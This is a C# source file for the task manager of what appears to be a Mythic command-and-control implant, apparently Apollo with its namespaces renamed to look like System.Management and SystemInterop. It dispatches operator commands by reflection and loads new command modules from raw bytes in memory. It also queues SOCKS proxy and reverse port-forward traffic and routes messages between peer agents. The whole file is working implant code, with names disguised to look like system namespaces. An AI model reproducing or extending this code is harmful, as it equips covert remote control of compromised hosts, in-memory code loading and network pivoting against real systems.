﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Collections.Concurrent;
using SystemInterop.Interfaces;
using SystemInterop.Types.Delegates;
using SystemInterop.Structs.MythicStructs;
using SystemInterop.Enums.SystemEnums;
using SystemInterop.Classes;
using System.Threading;
using  System.Threading.Tasks;
using System.Reflection;
using SystemInterop.Classes.Collections;
using SystemInterop.Utils;

namespace System.Management.Tasks
{
    public class TaskManager : ITaskManager
    {
        protected IAgent _agent;

        private ThreadSafeList<MythicTaskResponse> TaskResponseList = new();
        private ThreadSafeList<DelegateMessage> DelegateMessages = new();
        //private ConcurrentQueue<DelegateMessage> DelegateMessages = new ConcurrentQueue<DelegateMessage>();

        private Dictionary<MessageDirection, ConcurrentQueue<SocksDatagram>> SocksDatagramQueue = new()
        {
            { MessageDirection.ToMythic, new ConcurrentQueue<SocksDatagram>() },
            { MessageDirection.FromMythic, new ConcurrentQueue<SocksDatagram>() }
        };
        private Dictionary<MessageDirection, ConcurrentQueue<SocksDatagram>> RpfwdDatagramQueue = new()
        {
            { MessageDirection.ToMythic, new ConcurrentQueue<SocksDatagram>() },
            { MessageDirection.FromMythic, new ConcurrentQueue<SocksDatagram>() }
        };

        private ConcurrentDictionary<string, Tasking> _runningTasks = new();

        private ConcurrentDictionary<string, Type> _loadedTaskTypes = new();

        private ConcurrentQueue<MythicTask> TaskQueue = new();
        private ConcurrentQueue<MythicTaskStatus> TaskStatusQueue = new();
        private Action _taskConsumerAction;
        private Task _mainworker;
        private Assembly _tasksAsm = null;

        public TaskManager(IAgent agent)
        {
            _agent = agent;
            InitializeTaskLibrary();
            _taskConsumerAction = () =>
            {
                while(_agent.IsAlive())
                {
                    if (TaskQueue.TryDequeue(out MythicTask result))
                    {
                        if (!_loadedTaskTypes.ContainsKey(result.Command))
                        {
                            AddTaskResponseToQueue(new MythicTaskResponse()
                            {
                                UserOutput = $"Task '{result.Command}' not loaded.",
                                TaskID = result.ID,
                                Completed = true,
                                Status = "error"
                            });
                        }
                        else
                        {
                            try
                            {
                                Tasking t = (Tasking) Activator.CreateInstance(
                                    _loadedTaskTypes[result.Command],
                                    new object[] {_agent, result});
                                var taskObj = t.CreateTasking();
                                // When the task finishes, we remove it from the queue.
                                taskObj.ContinueWith((_) => { _runningTasks.TryRemove(t.ID(), out Tasking _); });
                                // Unhandled exception occurred in task, report it.
                                taskObj.ContinueWith((_) => { OnTaskErrorOrCancel(t, taskObj); },
                                    System.Threading.Tasks.TaskContinuationOptions.OnlyOnFaulted);
                                // If it got cancelled and threw an exception of that type,
                                // report it.
                                taskObj.ContinueWith((_) => { OnTaskErrorOrCancel(t, taskObj); },
                                    System.Threading.Tasks.TaskContinuationOptions.OnlyOnCanceled);
                                _runningTasks.TryAdd(t.ID(), t);
                                taskObj.Start();
                            }
                            catch (Exception ex)
                            {
                                AddTaskResponseToQueue(new MythicTaskResponse()
                                {
                                    UserOutput = $"Unexpected error during create and execute: {ex.Message}\n{ex.StackTrace}",
                                    TaskID = result.ID,
                                    Completed = true,
                                    Status = "error"
                                });
                            }
                        }

                    }
                    else
                    {
                        Thread.Sleep(100);
                    }
                }
            };
            _mainworker = new Task(_taskConsumerAction);
            _mainworker.Start();
        }

        private void InitializeTaskLibrary()
        {
            // Annoying note - if there's an assembly in the Tasks DLL that isn't in the System
            // reference assemblies, then you'll run into loading errors.
            _tasksAsm = Assembly.Load("Tasks, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
            if (_tasksAsm == null)
            {
                throw new Exception("Could not find loaded tasks assembly.");
            }
            foreach(Type t in _tasksAsm.GetTypes())
            {
                if (t.FullName.StartsWith("Tasks.") &&
                    t.IsPublic &&
                    t.IsClass &&
                    t.IsVisible)
                {
                    string commandName = t.FullName.Split('.')[1];
                    _loadedTaskTypes[commandName] = t;
                }
            }
        }

        public bool LoadTaskModule(byte[] taskAsm, string[] commands)
        {
            bool bRet = false;
            
            Assembly taskingAsm = Assembly.Load(taskAsm);
            Dictionary<string, Type> foundCmds = new Dictionary<string, Type>();
            foreach(Type t in taskingAsm.GetExportedTypes())
            {
                if (commands.Contains(t.Name))
                {
                    foundCmds[t.Name] = t;
                }
            }
            if (foundCmds.Keys.Count != commands.Length)
            {
                bRet = false;
            }
            else
            {
                foreach(string k in foundCmds.Keys)
                {
                    _loadedTaskTypes[k] = foundCmds[k];
                }
                bRet = true;
            }

            return bRet;
        }

        private void OnTaskErrorOrCancel(Tasking t, System.Threading.Tasks.Task taskObj)
        {
            string aggregateError = "";
            if (taskObj.Exception != null)
            {
                foreach (Exception e in taskObj.Exception.InnerExceptions)
                {
                    aggregateError += $"Unhandled exception: {e}\n\n";
                }
            } else if (taskObj.IsCanceled)
            {
                aggregateError = "Task cancelled.";
            }
            else
            {
                aggregateError = "Unhandled and unknown error occured.";
            }
            var msg = t.CreateTaskResponse(aggregateError, true, "error");
            AddTaskResponseToQueue(msg);
        }

        public void AddTaskResponseToQueue(MythicTaskResponse message)
        {
            TaskResponseList.Add(message);
        }

        public void AddDelegateMessageToQueue(DelegateMessage delegateMessage)
        {
            DelegateMessages.Add(delegateMessage);
        }

        public void AddSocksDatagramToQueue(MessageDirection direction, SocksDatagram dg)
        {
            SocksDatagramQueue[direction].Enqueue(dg);
        }
        public void AddRpfwdDatagramToQueue(MessageDirection direction, SocksDatagram dg)
        {
            RpfwdDatagramQueue[direction].Enqueue(dg);
        }


        public bool ProcessMessageResponse(MessageResponse resp)
        {
            if (resp.SocksDatagrams != null)
            {
                new Thread(() =>
                {
                    foreach(SocksDatagram dg in resp.SocksDatagrams)
                    {
                        _agent.GetSocksManager().Route(dg);
                    }
                }).Start();
            }
            if (resp.RpfwdDatagrams != null)
            {
                new Thread(() =>
                {
                    foreach (SocksDatagram dg in resp.RpfwdDatagrams)
                    {
                        _agent.GetRpfwdManager().Route(dg);
                    }
                }).Start();
            }

            if (resp.Tasks != null && resp.Tasks.Length > 0)
            {
                new Thread(() =>
                {
                    foreach(MythicTask t in resp.Tasks)
                    {
                        TaskQueue.Enqueue(t);
                    }
                }).Start();
            }
            if (resp.Responses != null && resp.Responses.Length > 0)
            {
                foreach(MythicTaskStatus t in resp.Responses)
                {
                    if (_agent.GetFileManager().GetPendingTransfers().Contains(t.ApolloTrackerUUID))
                    {
                        _agent.GetFileManager().ProcessResponse(t);
                    }
                }
            }
            if (resp.Delegates != null && resp.Delegates.Length > 0)
            {
                foreach(DelegateMessage d in resp.Delegates)
                {
                    _agent.GetPeerManager().Route(d);
                }
            }

            return true;
        }

        public bool CreateTaskingMessage(OnResponse<TaskingMessage> onResponse)
        {
            // We should pop messages from the task manager and stuff them into
            // this message here.

            //List<TaskResponse> responses = new List<TaskResponse>();
            //List<DelegateMessage> delegates = new List<DelegateMessage>();
            List<SocksDatagram> dgs = new List<SocksDatagram>();
            List<SocksDatagram> rpfwdDgs = new List<SocksDatagram>();
            List<EdgeNode> edgs = new List<EdgeNode>();
            //while(TaskResponseQueue.TryDequeue(out TaskResponse res))
            //{
            //    responses.Add(res);
            //}

            //while(DelegateMessages.TryDequeue(out var res))
            //{
            //    delegates.Add(res);
            //}

            while(SocksDatagramQueue[MessageDirection.ToMythic].TryDequeue(out var dg))
            {
                dgs.Add(dg);
            }
            while (RpfwdDatagramQueue[MessageDirection.ToMythic].TryDequeue(out var dg))
            {
                DebugHelp.DebugWriteLine($"got rpfwd datagram to go to mythic: {dg.ServerID}");
                rpfwdDgs.Add(dg);
            }

            TaskingMessage msg = new TaskingMessage()
            {
                Action = MessageAction.GetTasking.ToString(),
                TaskingSize = -1,
                Delegates = DelegateMessages.Flush(),
                Responses = TaskResponseList.Flush(),
                Socks = dgs.ToArray(),
                Rpfwd = rpfwdDgs.ToArray(),
                Edges = edgs.ToArray()
            };
            return onResponse(msg);
        }

        public string[] GetExecutingTaskIds()
        {
            return _runningTasks.Keys.ToArray();
        }

        public bool CancelTask(string taskId)
        {
            if (_runningTasks.TryGetValue(taskId, out Tasking t))
            {
                try
                {
                    t.Kill();
                    return true;
                } catch
                {
                    return false;
                }
            } else
            {
                return false;
            }
        }
    }
}
